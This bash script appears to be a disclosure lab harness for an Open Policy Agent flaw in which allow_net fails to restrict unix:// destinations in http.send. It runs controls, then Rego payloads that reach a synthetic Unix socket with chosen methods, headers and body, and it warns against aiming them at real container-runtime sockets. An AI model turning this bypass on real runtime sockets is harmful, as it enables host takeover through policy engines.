#!/usr/bin/env bash
# opa Lead 1 — `allow_net` does not restrict `unix://` destinations in `http.send`.
#
# Lifecycle harness for the lab that produced the evidence bundle at
# evidence/. Every precondition is asserted and the
# script dies rather than proceeding on a false success — a script that reports
# a control it did not run is worse than no script.
#
#   ./lab.sh up          pull the pinned image, start both receivers, mint caps files
#   ./lab.sh control     the four control rows. Dies if any control misbehaves.
#   ./lab.sh attack      the bypass row + the method/header/body characterisation
#   ./lab.sh sdk         the same crossing via rego.Capabilities() in a Go embedder
#   ./lab.sh repeat [N]  N consecutive reproductions (default 3), reset between each
#   ./lab.sh reset       truncate receiver logs, restart the socket receiver
#   ./lab.sh down        stop receivers, remove the bridge network
#   ./lab.sh all         up -> control -> attack -> sdk -> repeat 3 -> down
#
# Scope: synthetic receivers on this host only. NEVER point $SOCK at a real
# container-runtime socket — a synthetic socket proves the finding completely.
set -uo pipefail

PIN_TAG=v1.21.0
PIN_SHA=dc6269f2c648bbbece4b76fa1fc3dbb7b61cc7b6
IMAGE=openpolicyagent/opa:1.21.0
IMAGE_DIGEST=sha256:9e0010512cf405e66bfd7b89394f514e56fe0464822df0527e780344ab151450

LAB=${LAB:-./lab}
OUT=$LAB/run-artifacts
SOCK=$LAB/probe.sock
UNIXLOG=$LAB/unix.log
PIDFILE=$LAB/run-artifacts/unix-receiver.pid
NET=rl-opa-net
LISTENER=rl-opa-listener
LISTENER_PORT=19999

# Markers from `bun Lab.ts evidence opa 1`. A: the allowed destination.
# B: the destination outside the allowlist — the one that must not be reached.
MARK_A=${MARK_A:-CVEHUNT-1-87B0BCF6-A}
MARK_B=${MARK_B:-CVEHUNT-1-87B0BCF6-B}

die()  { printf '\n!! FAIL: %s\n' "$*" >&2; exit 1; }
ok()   { printf '   ok   %s\n' "$*"; }
head_() { printf '\n== %s ==\n' "$*"; }

# ---------------------------------------------------------------- helpers

# opa eval on the bridge network (the TCP receiver is reachable by name there)
e_net() {
  docker run --rm --network "$NET" -v "$LAB:/w:ro" "$IMAGE" \
    eval --capabilities "/w/$1" --strict-builtin-errors -f json "$2" 2>&1
}

# opa eval with NO network namespace at all. The unix:// rows need no network:
# useSocket (v1/topdown/http.go:368-399) replaces DialContext so both the
# network and the address argument are discarded. Running these with
# `--network none` is deliberate: it removes any doubt that the crossing is
# mediated by the host network, and there is no non-default exposure to declare.
e_nonet() {
  docker run --rm --network none -v "$LAB:/w" "$IMAGE" \
    eval --capabilities "/w/$1" --strict-builtin-errors -f json "$2" 2>&1
}

# Extract just the builtin error message, or the literal string "NO-ERROR".
err_of() { python3 -c '
import json,sys
try: d=json.loads(sys.stdin.read())
except Exception as e: print("UNPARSEABLE:%s"%e); sys.exit(0)
es=d.get("errors")
print(es[0]["message"] if es else "NO-ERROR")
'; }

# Extract status_code + raw_body of the bound response, or "NO-RESULT".
resp_of() { python3 -c '
import json,sys
try: d=json.loads(sys.stdin.read())
except Exception as e: print("UNPARSEABLE:%s"%e); sys.exit(0)
if d.get("errors"): print("ERROR:%s"%d["errors"][0]["message"]); sys.exit(0)
try: b=d["result"][0]["bindings"]["resp"]
except Exception: print("NO-RESULT"); sys.exit(0)
rb = (b.get("raw_body") or "").replace("\n", " ").replace("\r", " ")
if len(rb) > 120: rb = rb[:120] + "...[truncated]"
print("status_code=%s raw_body=%s" % (b.get("status_code"), rb))
'; }

# Receiver lifecycle via a pidfile. Do NOT use `pkill -f unix-receiver.py`: it
# matches any process whose command line merely mentions the script, which
# includes an interactive shell that typed the name — it will kill the caller.
stop_receiver() {
  if [ -f "$PIDFILE" ]; then
    pid=$(cat "$PIDFILE" 2>/dev/null)
    if [ -n "${pid:-}" ] && kill -0 "$pid" 2>/dev/null; then
      kill "$pid" 2>/dev/null
      for _ in $(seq 20); do kill -0 "$pid" 2>/dev/null || break; sleep 0.1; done
      kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
    fi
    rm -f "$PIDFILE"
  fi
  rm -f "$SOCK"
}

start_receiver() {
  mkdir -p "$OUT"
  nohup python3 "$LAB/unix-receiver.py" "$SOCK" "$UNIXLOG" "$MARK_B-unixsock-hit" \
    > "$OUT/receiver.out" 2>&1 &
  echo $! > "$PIDFILE"
  for _ in $(seq 25); do [ -S "$SOCK" ] && break; sleep 0.2; done
  [ -S "$SOCK" ] || die "socket receiver never created $SOCK (see $OUT/receiver.out)"
}

# `grep -c` prints 0 AND exits 1 on no match, so `grep -c ... || echo 0` emits
# TWO lines and every numeric comparison against it fails. Count with a pipeline
# that always exits 0 and always prints exactly one line.
# The TCP receiver must be RECREATED, not restarted, on reset: `docker logs`
# returns the whole history of a container, so a restarted listener still
# reports the previous phase's arrivals and "no request reached it" becomes
# unprovable. Recreating is the only reset that actually resets.
start_listener() {
  docker network create "$NET" >/dev/null 2>&1
  docker rm -f "$LISTENER" >/dev/null 2>&1
  docker run -d --name "$LISTENER" --network "$NET" -w /srv python:3.12-alpine \
    python3 -u -m http.server "$LISTENER_PORT" --bind 0.0.0.0 >/dev/null \
    || die "cannot start $LISTENER"
  for _ in $(seq 40); do
    [ "$(docker inspect -f '{{.State.Running}}' "$LISTENER" 2>/dev/null)" = true ] && break
    sleep 0.2
  done
  [ "$(docker inspect -f '{{.State.Running}}' "$LISTENER" 2>/dev/null)" = true ] \
    || die "$LISTENER is not running"
  # A running container is NOT a listening socket. `http.server` binds a moment
  # after the container starts, and a control row fired into that gap comes back
  # "connection refused" — which reads exactly like the allowlist blocking it.
  # Wait for the bind line, then prove the port actually answers. `python3 -u`
  # is required: http.server prints its bind line to STDOUT, which is
  # block-buffered under a pipe, so without -u the line never reaches
  # `docker logs` and the wait times out on a perfectly healthy listener.
  for _ in $(seq 50); do
    docker logs "$LISTENER" 2>&1 | grep -q "Serving HTTP on" && break
    sleep 0.2
  done
  docker logs "$LISTENER" 2>&1 | grep -q "Serving HTTP on" \
    || die "$LISTENER never printed its bind line — see: docker logs $LISTENER"
  docker run --rm --network "$NET" python:3.12-alpine python3 -c "
import socket,sys
s=socket.create_connection(('$LISTENER',$LISTENER_PORT),timeout=5); s.close()
" >/dev/null 2>&1 || die "$LISTENER:$LISTENER_PORT does not accept connections"
  # Containment: this receiver must publish nothing to the host.
  ports=$(docker inspect "$LISTENER" --format '{{json .NetworkSettings.Ports}}')
  [ "$ports" = "{}" ] || die "CONTAINMENT: $LISTENER publishes ports to the host: $ports"
}

unix_hits() {
  if [ -f "$UNIXLOG" ]; then grep -c "^b'" "$UNIXLOG" 2>/dev/null | head -1; else echo 0; fi
}
tcp_hits() {
  docker logs "$LISTENER" 2>&1 | grep -c '"GET\|"POST' 2>/dev/null | head -1
}

# ---------------------------------------------------------------- up

cmd_up() {
  head_ "up — pinned image, capabilities files, two receivers"
  mkdir -p "$OUT" || die "cannot create $OUT"   # creates $LAB as well

  docker image inspect "$IMAGE" >/dev/null 2>&1 || docker pull "$IMAGE" >/dev/null \
    || die "cannot pull $IMAGE"

  # ASSERT the image is the pin, in both directions. Gate 1a: the tag a compose
  # file or a docs snippet names is not evidence of the code that runs.
  got_digest=$(docker image inspect "$IMAGE" --format '{{index .RepoDigests 0}}')
  [ "${got_digest#*@}" = "$IMAGE_DIGEST" ] \
    || die "image digest is ${got_digest#*@}, expected $IMAGE_DIGEST"
  ok "image digest $IMAGE_DIGEST"

  got_commit=$(docker run --rm "$IMAGE" version | awk '/^Build Commit:/{print $3}')
  [ "${got_commit%-dirty}" = "$PIN_SHA" ] \
    || die "image Build Commit is $got_commit, expected $PIN_SHA ($PIN_TAG)"
  ok "image Build Commit ${got_commit} == $PIN_TAG"

  # Capabilities files. `opa capabilities --current` does NOT emit an allow_net
  # key — there is no CLI flag for it either, so injecting it by hand is the
  # only way an operator can express this restriction. Assert that, because it
  # is load-bearing for the report.
  docker run --rm "$IMAGE" capabilities --current > "$LAB/caps-base.json" \
    || die "opa capabilities --current failed"
  python3 - "$LAB" <<'PY' || die "capabilities generation failed"
import json, sys
lab = sys.argv[1]
b = json.load(open(lab + '/caps-base.json'))
assert 'allow_net' not in b, "allow_net unexpectedly present in `opa capabilities --current`"
for name, allow in [('caps-allow-example.json', ['allowed.example.com']),
                    ('caps-allow-listener.json', ['rl-opa-listener']),
                    ('caps-none.json', [])]:
    c = dict(b); c['allow_net'] = allow
    json.dump(c, open(lab + '/' + name, 'w'))
print('   ok   %d builtins at the pin; allow_net absent from --current, injected by hand'
      % len(b['builtins']))
PY

  # Receiver 1 — the UNIX socket. This is the destination the allowlist never names.
  stop_receiver
  : > "$UNIXLOG"
  # Seed the receiver from the copy that ships next to this script, so the lab
  # can be rebuilt from the research workspace alone.
  if [ ! -f "$LAB/unix-receiver.py" ]; then
    src="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/unix-receiver.py"
    [ -f "$src" ] || die "no unix-receiver.py beside lab.sh ($src) and none at $LAB"
    cp "$src" "$LAB/unix-receiver.py" || die "cannot seed unix-receiver.py into $LAB"
    ok "seeded unix-receiver.py from $src"
  fi
  chmod +x "$LAB/unix-receiver.py"
  [ -x "$LAB/unix-receiver.py" ] || die "missing $LAB/unix-receiver.py"
  start_receiver
  ok "unix receiver listening on $SOCK"

  # Receiver 2 — the TCP destination, in a sidecar container on a bridge network.
  # It publishes NOTHING to the host: containment is that the port map is empty.
  start_listener
  ok "tcp receiver up on $LISTENER:$LISTENER_PORT, nothing published to the host"
}

# ---------------------------------------------------------------- reset

cmd_reset() {
  head_ "reset — truncate receiver logs, restart the socket receiver"
  stop_receiver
  : > "$UNIXLOG"
  start_receiver
  # ASSERT the postcondition rather than announcing it: a reset that prints
  # success while leaving stale state is the exact failure it exists to prevent.
  [ "$(unix_hits)" = 0 ] || die "unix.log still holds $(unix_hits) request(s) after reset"
  start_listener
  [ "$(tcp_hits)" = 0 ] \
    || die "$LISTENER log still holds $(tcp_hits) request(s) after recreation"
  ok "both receiver logs empty, socket re-bound"
}

# ---------------------------------------------------------------- control

cmd_control() {
  head_ "control — the restriction working, four ways. Dies if any row misbehaves."
  cmd_reset >/dev/null || die "reset before control failed"

  # P: positive control. allow_net names the destination -> the request arrives.
  # Without this row a reader cannot tell a working check from a broken harness.
  out=$(e_net caps-allow-listener.json \
    "resp = http.send({\"method\":\"get\",\"url\":\"http://$LISTENER:$LISTENER_PORT/$MARK_A-P-positive\"})")
  echo "$out" > "$OUT/control-P.json"
  r=$(printf '%s' "$out" | resp_of)
  case "$r" in status_code=*) ok "P  allow_net=[$LISTENER]  -> $r" ;;
    *) die "P: positive control did not complete: $r" ;; esac
  docker logs "$LISTENER" 2>&1 | grep -q "$MARK_A-P-positive" \
    || die "P: request never arrived at $LISTENER — the harness is broken, not the target"
  ok "P  arrival confirmed in the receiver's own log"

  # C1: the host check works on a TCP destination.
  out=$(e_net caps-allow-example.json \
    "resp = http.send({\"method\":\"get\",\"url\":\"http://$LISTENER:$LISTENER_PORT/$MARK_A-C1-disallowed-host\"})")
  echo "$out" > "$OUT/control-C1.json"
  m=$(printf '%s' "$out" | err_of)
  [ "$m" = "http.send: disallowed host: $LISTENER" ] \
    || die "C1: expected 'disallowed host: $LISTENER', got: $m"
  docker logs "$LISTENER" 2>&1 | grep -q "$MARK_A-C1-disallowed-host" \
    && die "C1: a blocked request still reached the receiver"
  ok "C1 allow_net=[allowed.example.com], tcp host -> blocked: $m"

  # C2: the same unix:// URL, authority not in allow_net -> blocked.
  # This is the row that makes the attack row mean something: it shows the check
  # is on, and on this exact URL shape.
  out=$(e_nonet caps-allow-example.json \
    "resp = http.send({\"method\":\"get\",\"url\":\"unix://notallowed.example.com/$MARK_B-C2?socket=%2Fw%2Fprobe.sock\"})")
  echo "$out" > "$OUT/control-C2.json"
  m=$(printf '%s' "$out" | err_of)
  [ "$m" = "http.send: disallowed host: notallowed.example.com" ] \
    || die "C2: expected 'disallowed host: notallowed.example.com', got: $m"
  ok "C2 unix://, authority not allowed -> blocked: $m"

  # C3: allow_net: [] is documented as "NO host can be connected to".
  out=$(e_nonet caps-none.json \
    "resp = http.send({\"method\":\"get\",\"url\":\"unix://allowed.example.com/$MARK_B-C3?socket=%2Fw%2Fprobe.sock\"})")
  echo "$out" > "$OUT/control-C3.json"
  m=$(printf '%s' "$out" | err_of)
  [ "$m" = "http.send: disallowed host: allowed.example.com" ] \
    || die "C3: expected 'disallowed host: allowed.example.com', got: $m"
  ok "C3 allow_net=[] -> blocked: $m"

  # The load-bearing assertion for the whole control phase: after four control
  # rows, NOTHING has reached the socket.
  h=$(unix_hits)
  [ "$h" = 0 ] || die "controls leaked $h request(s) to $SOCK — see $UNIXLOG"
  ok "no request reached $SOCK during any control row"
}

# ---------------------------------------------------------------- attack

cmd_attack() {
  head_ "attack — allowed authority, socket path never checked"
  before=$(unix_hits)

  out=$(e_nonet caps-allow-example.json \
    "resp = http.send({\"method\":\"get\",\"url\":\"unix://allowed.example.com/$MARK_B-A-bypass?socket=%2Fw%2Fprobe.sock\"})")
  echo "$out" > "$OUT/attack-A.json"
  r=$(printf '%s' "$out" | resp_of)
  case "$r" in
    status_code=200*) ok "A  allow_net=[allowed.example.com], unix:// -> $r" ;;
    *) die "A: the bypass did not complete: $r" ;;
  esac
  grep -q "$MARK_B-A-bypass" "$UNIXLOG" \
    || die "A: no request carrying $MARK_B-A-bypass in $UNIXLOG"
  printf '%s' "$r" | grep -q "$MARK_B-unixsock-hit" \
    || die "A: the socket's marked response did not come back into Rego"
  ok "A  the socket's marked body was returned to the policy — not blind"

  # A2: characterise the crossing. Attacker-chosen method, headers and body all
  # reach the socket, which is what makes a container-runtime socket exploitable
  # rather than merely reachable. One row, then stop.
  out=$(e_nonet caps-allow-example.json \
    "resp = http.send({\"method\":\"post\",\"url\":\"unix://allowed.example.com/$MARK_B-A2-post?socket=%2Fw%2Fprobe.sock\",\"headers\":{\"X-Cvehunt\":\"$MARK_B-A2-header\",\"Content-Type\":\"application/json\"},\"raw_body\":\"{\\\"cvehunt\\\":\\\"$MARK_B-A2-body\\\"}\"})")
  echo "$out" > "$OUT/attack-A2.json"
  r=$(printf '%s' "$out" | resp_of)
  case "$r" in status_code=200*) ok "A2 POST with headers and body -> $r" ;;
    *) die "A2: did not complete: $r" ;; esac
  for needle in "POST /$MARK_B-A2-post" "X-Cvehunt: $MARK_B-A2-header" "$MARK_B-A2-body"; do
    grep -q -- "$needle" "$UNIXLOG" || die "A2: '$needle' never reached the socket"
  done
  ok "A2 method, custom header and body all arrived verbatim at $SOCK"

  after=$(unix_hits)
  [ "$after" -gt "$before" ] || die "hit count did not increase ($before -> $after)"
}

# ---------------------------------------------------------------- repeat

cmd_repeat() {
  n=${1:-3}
  head_ "repeat — $n consecutive reproductions, full reset between each"
  : > "$OUT/repeat.log"
  for i in $(seq "$n"); do
    cmd_reset >/dev/null || die "reset before reproduction $i failed"
    [ "$(unix_hits)" = 0 ] || die "reproduction $i did not start from a clean log"
    out=$(e_nonet caps-allow-example.json \
      "resp = http.send({\"method\":\"get\",\"url\":\"unix://allowed.example.com/$MARK_B-R$i?socket=%2Fw%2Fprobe.sock\"})")
    r=$(printf '%s' "$out" | resp_of)
    case "$r" in status_code=200*) : ;; *) die "reproduction $i failed: $r" ;; esac
    grep -q "$MARK_B-R$i" "$UNIXLOG" || die "reproduction $i: marker absent from $UNIXLOG"
    [ "$(unix_hits)" = 1 ] \
      || die "reproduction $i: expected exactly 1 arrival, saw $(unix_hits)"
    {
      echo "--- reproduction $i/$n (clean reset before each) ---"
      echo "rego   : http.send GET unix://allowed.example.com/$MARK_B-R$i?socket=%2Fw%2Fprobe.sock"
      echo "caps   : allow_net = [\"allowed.example.com\"]"
      echo "network: none"
      echo "result : $r"
      echo "socket : $(grep "^b'" "$UNIXLOG")"
    } >> "$OUT/repeat.log"
    ok "reproduction $i/$n -> $r"
  done
  ok "$n/$n reproductions, deterministic. transcript: $OUT/repeat.log"
}

# ---------------------------------------------------------------- sdk

# The embedder path: the same crossing through rego.Capabilities() rather than
# --capabilities. Needs a Go toolchain, which this host does not have, so the
# build runs in golang:1.26 (opa's go.mod says `go 1.26.0`) with the module cache
# on a named volume so a re-run does not re-download the world.
# CGO_ENABLED=0 is required: a dynamically-linked build against the golang image
# will not exec on an older runtime base, and the failure ("no such file or
# directory" on a file that plainly exists) reads like a mount problem.
cmd_sdk() {
  head_ "sdk — the embedder path via rego.Capabilities()"
  [ -f "$LAB/sdk/main.go" ] || {
    src="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/sdk"
    [ -d "$src" ] || die "no sdk/ beside lab.sh ($src) and none at $LAB/sdk"
    mkdir -p "$LAB/sdk" && cp "$src/main.go" "$src/go.mod" "$LAB/sdk/" \
      || die "cannot seed sdk sources into $LAB/sdk"
    ok "seeded sdk sources from $src"
  }
  docker run --rm -v "$LAB/sdk:/src" -w /src -v opa-gomod:/go/pkg/mod \
    -e CGO_ENABLED=0 golang:1.26 \
    sh -c 'go mod tidy >/dev/null 2>&1; go build -o /src/probe .' \
    || die "embedder build failed"
  [ -x "$LAB/sdk/probe" ] || die "no probe binary after build"
  file "$LAB/sdk/probe" | grep -q 'statically linked' \
    || die "probe is not statically linked — it will not exec on alpine"
  ok "embedder built against github.com/open-policy-agent/opa v1.21.0, static"

  cmd_reset >/dev/null || die "reset before the sdk rows failed"
  out=$(docker run --rm --network none -v "$LAB:/w" -e MARK_B="$MARK_B" \
          --entrypoint /w/sdk/probe alpine:3.20 2>&1)
  echo "$out" > "$OUT/sdk-run.txt"

  # Two controls must refuse and the attack row must return the marked body.
  echo "$out" | grep -q "disallowed host: notallowed.example.com" \
    || die "sdk control 1 did not refuse — see $OUT/sdk-run.txt"
  echo "$out" | grep -q "disallowed host: allowed.example.com" \
    || die "sdk control 2 (allow_net=[]) did not refuse — see $OUT/sdk-run.txt"
  echo "$out" | grep -q "status_code = 200" \
    || die "sdk attack row did not complete — see $OUT/sdk-run.txt"
  echo "$out" | grep -q "$MARK_B-unixsock-hit" \
    || die "sdk attack row did not return the socket's marked body"
  grep -q "$MARK_B-SDK-A" "$UNIXLOG" || die "sdk attack row never reached $SOCK"
  [ "$(unix_hits)" = 1 ] \
    || die "expected exactly 1 socket arrival across the three sdk rows, saw $(unix_hits)"
  ok "sdk: 2 controls refused, attack row crossed, exactly 1 socket arrival"
}

# ---------------------------------------------------------------- down

cmd_down() {
  head_ "down"
  stop_receiver
  docker rm -f "$LISTENER" >/dev/null 2>&1
  docker network rm "$NET" >/dev/null 2>&1
  [ -S "$SOCK" ] && die "socket still present after down"
  docker ps --format '{{.Names}}' | grep -qx "$LISTENER" && die "$LISTENER still running"
  ok "receivers stopped, network removed"
}

case "${1:-all}" in
  up) cmd_up ;;
  reset) cmd_reset ;;
  control) cmd_control ;;
  attack) cmd_attack ;;
  repeat) cmd_repeat "${2:-3}" ;;
  sdk) cmd_sdk ;;
  down) cmd_down ;;
  all) cmd_up && cmd_control && cmd_attack && cmd_sdk && cmd_repeat 3 && cmd_down
       printf '\n== all phases passed ==\n' ;;
  *) die "unknown subcommand: $1" ;;
esac
